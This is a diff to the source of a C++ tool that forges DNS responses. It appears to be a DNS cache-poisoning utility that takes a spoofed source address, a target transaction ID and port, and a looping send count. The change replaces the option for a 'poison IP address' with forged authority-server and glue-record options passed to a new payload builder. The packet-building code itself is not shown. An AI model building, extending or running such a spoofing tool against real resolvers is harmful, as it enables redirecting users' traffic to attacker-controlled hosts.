@@ -58,27 +58,33 @@ main(int argc, char** argv)
     uint16_t target_id = 0;
     uint16_t target_port = 0;
     std::string opt_d;
-    std::string opt_a;
+    //std::string opt_a;
     std::string opt_r;
     std::string opt_s;
+    std::string opt_n;
+    std::string opt_g;
+    std::string opt_t;
 
     struct option long_options[] = {
         {"help",    no_argument,       NULL, 'h'},
 #ifdef DEBUG
         {"verbose", no_argument,       NULL, 'v'},
 #endif
-        {"dst",     required_argument, NULL, 'd'},
-        {"src",     required_argument, NULL, 's'},
-        {"ans",     required_argument, NULL, 'a'},
-        {"req",     required_argument, NULL, 'r'},
-        {"count",   required_argument, NULL, 'c'},
-        {"t_port",  required_argument, NULL, 'x'},
-        {"t_id",    required_argument, NULL, 'y'},
+        {"dst",   required_argument, NULL, 'd'},
+        {"src",   required_argument, NULL, 's'},
+        //{"ans",   required_argument, NULL, 'a'},
+        {"req",   required_argument, NULL, 'r'},
+        {"auth",  required_argument, NULL, 'n'},
+        {"gname", required_argument, NULL, 'g'},
+        {"gaddr", required_argument, NULL, 't'},
+        {"count", required_argument, NULL, 'c'},
+        {"t_port",required_argument, NULL, 'x'},
+        {"t_id",  required_argument, NULL, 'y'},
         {0, 0, 0, 0}
     };
 
 
-    while ((opt = getopt_long(argc, argv, "a:r:d:s:c:x:y:?hv", long_options, &option_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "a:r:d:s:c:x:y:n:g:t:?hv", long_options, &option_index)) != -1) {
         switch (opt) {
 #ifdef DEBUG
             case 'v':
@@ -95,11 +101,22 @@ main(int argc, char** argv)
             case 's':
                 opt_s = optarg;
                 break;
+            /*
             case 'a':
                 opt_a = optarg;
                 break;
+            */
             case 'r':
                 opt_r = optarg;
+                break;
+            case 'n':
+                opt_n = optarg;
+                break;
+            case 'g':
+                opt_g = optarg;
+                break;
+            case 't':
+                opt_t = optarg;
                 break;
             case 'x':
                 try {
@@ -153,12 +170,33 @@ main(int argc, char** argv)
         exit(EXIT_FAILURE);
     }
 
+    /*
     if (opt_a.size() == 0) {
         usage(argv[0]);
         exit(EXIT_FAILURE);
     } else if (!is_ipv4_address(opt_a)) {
         usage(argv[0]);
         printf("(-a) the poison IP address was not parseable string.\n");
+        exit(EXIT_FAILURE);
+    }
+    */
+
+    if (opt_t.size() == 0) {
+        usage(argv[0]);
+        exit(EXIT_FAILURE);
+    } else if (!is_ipv4_address(opt_t)) {
+        usage(argv[0]);
+        printf("(-t) the additional glue_name IP address was not parseable string.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if (opt_n.size() == 0) {
+        usage(argv[0]);
+        exit(EXIT_FAILURE);
+    }
+
+    if (opt_g.size() == 0) {
+        usage(argv[0]);
         exit(EXIT_FAILURE);
     }
 
@@ -189,9 +227,9 @@ main(int argc, char** argv)
         nb->set_udphdr(53, assign_port());
     }
     if (target_id != 0) {
-        nb->set_payload_dns_ans(target_id, QR|AA|RD|RA, opt_r, opt_a);
+        nb->set_payload_ioprey(target_id, QR|AA|RD|RA|NX, opt_r, opt_n, opt_g, opt_t);
     } else {
-        nb->set_payload_dns_ans(assign_dns_id(), QR|AA|RD|RA, opt_r, opt_a);
+        nb->set_payload_ioprey(assign_dns_id(), QR|AA|RD|RA|NX, opt_r, opt_n, opt_g, opt_t);
     }
     nb->post_processing();
 
@@ -267,8 +305,11 @@ void usage(char* prog_name)
     printf("  Must..\n");
     printf("    -s [source address]\n");
     printf("    -d [destination address]\n");
-    printf("    -a [ans address] \n");
-    printf("    -r [req name]\n");
+    //printf("    -a [answer address] \n");
+    printf("    -r [request name]\n");
+    printf("    -n [Authority server name]\n");
+    printf("    -g [Glue server name]\n");
+    printf("    -t [Glue server address]\n");
     printf("  Option..\n");
     printf("    -c [count number]  : 0 is loop   (default:0)\n");
     printf("    -x [target port]   : 0 is random (default:0)\n");
